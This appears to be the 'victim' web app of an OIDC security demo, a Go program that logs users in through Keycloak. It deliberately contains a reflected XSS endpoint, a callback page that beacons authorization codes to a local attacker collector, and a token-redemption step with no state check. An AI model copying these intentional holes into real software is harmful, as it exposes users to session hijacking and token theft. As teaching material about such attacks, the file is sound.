// Command auth_code is the "victim" relying party (RP): a minimal web app
// that logs users in against Keycloak using the OIDC Authorization Code
// Flow, and renders every step of the handshake so it's easy to follow.
//
// It also exposes an intentionally vulnerable /search endpoint (reflected
// XSS) used by the companion ./attacker server to demonstrate how a
// "shadow" injected script can hijack the login flow and steal tokens.
//
// Run (after Keycloak is up, see README.md):
//
//	go run .
package main

import (
	"encoding/json"
	"html/template"
	"log"
	"net/http"
	"os"
	"sync"
	"time"

	"oidc-demo/internal/oidcutil"
)

const (
	listenAddr      = ":8081"
	rpBaseURL       = "http://localhost:8081"
	callbackURL     = rpBaseURL + "/callback"
	confCallbackURL = rpBaseURL + "/conf/callback"
	scopes          = "openid profile email"

	// attackerBeaconURL models a compromised/malicious third-party widget
	// (analytics, ads, chat...) embedded on the OIDC callback page. It's
	// the leak vector for the confidential-client scenario below.
	attackerBeaconURL = "http://localhost:9090/collect"
)

var cfg = oidcutil.Config{
	IssuerBase: "http://localhost:8080",
	Realm:      "demo",
	ClientID:   "demo-rp",
}

// confCfg is a second, confidential client ("demo-conf", has a
// client_secret) used to show that a stolen authorization code is still
// dangerous even when only the backend - never the browser or attacker -
// ever touches the client secret and the resulting tokens.
var confCfg = oidcutil.Config{
	IssuerBase: "http://localhost:8080",
	Realm:      "demo",
	ClientID:   "demo-conf",
}

// confClientSecret must match the secret on demo-conf's Credentials tab in
// Keycloak. Override via env var; the fallback is just a dev convenience.
var confClientSecret = envOr("DEMO_CONF_CLIENT_SECRET", "changeme-copy-from-keycloak")

func envOr(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

var tmpl = template.Must(template.ParseGlob("templates/*.html"))

// session represents a logged-in browser session at the RP.
type session struct {
	Log    []string
	Claims map[string]any
	Tokens *oidcutil.TokenResponse
}

var (
	mu       sync.Mutex
	sessions = map[string]*session{}  // session cookie value -> session
	pending  = map[string]time.Time{} // state value -> issued-at, awaiting /callback
)

func main() {
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/login", handleLogin)
	http.HandleFunc("/callback", handleCallback)
	http.HandleFunc("/profile", handleProfile)
	http.HandleFunc("/search", handleSearch) // intentionally vulnerable, see comment below

	// Confidential-client scenario: hidden-iframe silent login + leaked code.
	http.HandleFunc("/conf/login", handleConfLogin)
	http.HandleFunc("/conf/callback", handleConfCallback)
	http.HandleFunc("/conf/finish", handleConfFinish)

	log.Printf("RP (victim app) listening on %s", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, nil))
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	_ = tmpl.ExecuteTemplate(w, "index.html", nil)
}

// handleLogin starts the Authorization Code Flow: it mints a CSRF `state`
// value, remembers it server-side, and redirects the browser to Keycloak.
func handleLogin(w http.ResponseWriter, r *http.Request) {
	state := oidcutil.RandString(16)

	mu.Lock()
	pending[state] = time.Now()
	mu.Unlock()

	authURL := oidcutil.BuildAuthURL(cfg, callbackURL, state, scopes)
	log.Printf("[rp] redirecting browser to authorize endpoint, state=%s", state)
	http.Redirect(w, r, authURL, http.StatusFound)
}

// handleCallback is where Keycloak sends the browser back with ?code=&state=.
// It validates state (CSRF protection for the redirect step) then exchanges
// the code for tokens directly with Keycloak (server-to-server).
func handleCallback(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")
	state := r.URL.Query().Get("state")

	mu.Lock()
	_, known := pending[state]
	delete(pending, state)
	mu.Unlock()

	if code == "" || state == "" || !known {
		http.Error(w, "invalid or missing state - possible CSRF, rejecting callback", http.StatusBadRequest)
		return
	}

	steps := []string{
		"Browser -> RP: GET /login",
		"RP -> Browser: 302 to Keycloak /auth with response_type=code, state=" + state,
		"Browser -> Keycloak: user authenticates, consents",
		"Keycloak -> Browser: 302 to /callback?code=...&state=" + state,
		"RP validated state (CSRF check passed)",
	}

	tokens, err := oidcutil.ExchangeCode(cfg, code, callbackURL)
	if err != nil {
		http.Error(w, "token exchange failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	steps = append(steps,
		"RP -> Keycloak: POST /token (grant_type=authorization_code)",
		"Keycloak -> RP: access_token, id_token, refresh_token")

	claims, err := oidcutil.DecodeIDTokenUnsafe(tokens.IDToken)
	if err != nil {
		http.Error(w, "decoding id_token failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	steps = append(steps, "RP created a local session and set a session cookie")

	sessID := oidcutil.RandString(16)
	mu.Lock()
	sessions[sessID] = &session{Log: steps, Claims: claims, Tokens: tokens}
	mu.Unlock()

	http.SetCookie(w, &http.Cookie{
		Name:     "oidc_session",
		Value:    sessID,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
	})
	http.Redirect(w, r, "/profile", http.StatusFound)
}

func handleProfile(w http.ResponseWriter, r *http.Request) {
	c, err := r.Cookie("oidc_session")
	if err != nil {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
	mu.Lock()
	sess, ok := sessions[c.Value]
	mu.Unlock()
	if !ok {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}

	claimsJSON, _ := json.MarshalIndent(sess.Claims, "", "  ")
	short := sess.Tokens.AccessToken
	if len(short) > 40 {
		short = short[:40] + "..."
	}

	_ = tmpl.ExecuteTemplate(w, "profile.html", map[string]any{
		"Log":              sess.Log,
		"ClaimsJSON":       string(claimsJSON),
		"AccessTokenShort": short,
	})
}

// handleSearch is DELIBERATELY VULNERABLE to reflected XSS: it writes the
// `q` query parameter back into the page without HTML-escaping it. This
// models a "shadow" injection point on an otherwise legitimate site that an
// attacker can use to run script in the victim's authenticated browser
// session (see ../attacker/main.go for the exploit).
func handleSearch(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query().Get("q")
	_ = tmpl.ExecuteTemplate(w, "search.html", map[string]any{
		"QueryUnsafe": template.HTML(q), // NEVER do this with untrusted input in real code
	})
}

// handleConfLogin starts the Authorization Code Flow for the confidential
// client. It behaves identically whether the browser navigated here itself
// or - as in the attack demo - a hidden <iframe> on an attacker page did.
func handleConfLogin(w http.ResponseWriter, r *http.Request) {
	state := oidcutil.RandString(16)

	mu.Lock()
	pending[state] = time.Now()
	mu.Unlock()

	authURL := oidcutil.BuildAuthURL(confCfg, confCallbackURL, state, scopes)
	log.Printf("[rp] (conf) redirecting to authorize endpoint, state=%s", state)
	http.Redirect(w, r, authURL, http.StatusFound)
}

// handleConfCallback receives Keycloak's redirect with ?code=&state=. Unlike
// the public-client /callback, it does NOT redeem the code immediately.
// Instead it renders an interim page - modeling a real app whose callback
// landing page embeds a third-party script - that leaks the code to the
// attacker's beacon and only then (after a short delay) asks the backend
// to finish the exchange. That delay is what lets the attacker's server
// win the race and redeem the code first.
func handleConfCallback(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")
	state := r.URL.Query().Get("state")

	mu.Lock()
	_, known := pending[state]
	delete(pending, state) // state's job (CSRF-protecting this leg) ends here
	mu.Unlock()

	if code == "" || state == "" || !known {
		http.Error(w, "invalid or missing state - possible CSRF, rejecting callback", http.StatusBadRequest)
		return
	}

	_ = tmpl.ExecuteTemplate(w, "conf_callback.html", map[string]any{
		"BeaconURL": attackerBeaconURL + "?code=" + template.URLQueryEscaper(code) + "&state=" + template.URLQueryEscaper(state),
		"FinishURL": "/conf/finish?code=" + template.URLQueryEscaper(code),
	})
}

// handleConfFinish is the RP backend's actual token-redemption step: it
// holds the confidential client's secret and is the only thing that ever
// talks to Keycloak's token endpoint for this flow. It does NOT re-check
// state - the token endpoint itself never does either - so whoever gets
// here first with a valid, unused code wins: the real browser, or an
// attacker's server that raced it here after the beacon leak.
func handleConfFinish(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")
	if code == "" {
		http.Error(w, "missing code", http.StatusBadRequest)
		return
	}

	steps := []string{
		"Browser -> RP: hidden iframe hit GET /conf/login",
		"RP -> Browser: 302 to Keycloak /auth (confidential client demo-conf)",
		"Browser -> Keycloak: already has an SSO session, silently issues a code",
		"Keycloak -> Browser: 302 to /conf/callback?code=...&state=...",
		"RP served an interim page that (vulnerably) beacons the code to a third party before redeeming it",
		"RP backend -> Keycloak: POST /token with client_id+client_secret (grant_type=authorization_code)",
	}

	tokens, err := oidcutil.ExchangeCodeConfidential(confCfg, confClientSecret, code, confCallbackURL)
	if err != nil {
		http.Error(w, "token exchange failed (code already used - possibly stolen and redeemed by someone else): "+err.Error(), http.StatusBadGateway)
		return
	}
	steps = append(steps, "Keycloak -> RP backend: access_token, id_token, refresh_token (never sent to the browser)")

	claims, err := oidcutil.DecodeIDTokenUnsafe(tokens.IDToken)
	if err != nil {
		http.Error(w, "decoding id_token failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	steps = append(steps, "RP backend created a session and set a session cookie on whoever called this endpoint")

	sessID := oidcutil.RandString(16)
	mu.Lock()
	sessions[sessID] = &session{Log: steps, Claims: claims, Tokens: tokens}
	mu.Unlock()

	http.SetCookie(w, &http.Cookie{
		Name:     "oidc_session",
		Value:    sessID,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
	})
	http.Redirect(w, r, "/profile", http.StatusFound)
}
